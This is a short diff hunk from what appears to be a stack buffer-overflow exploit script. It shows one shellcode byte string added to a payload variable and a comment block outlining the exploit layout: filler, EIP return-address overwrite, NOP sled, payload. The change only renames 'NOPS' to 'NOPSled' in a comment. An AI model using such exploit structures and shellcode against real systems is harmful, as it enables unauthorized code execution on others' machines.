@@ -46,7 +46,7 @@ payload += "\x6f\x4f\x89\x5e"
 #----------------------------#
 # buffer = AAA...........AAA #
 # buffer = EIP - RET Address #
-# buffer = NOPS              #
+# buffer = NOPSled           #
 # buffer = payload           #
 # buffer = BBB...........BBB #
 #----------------------------#
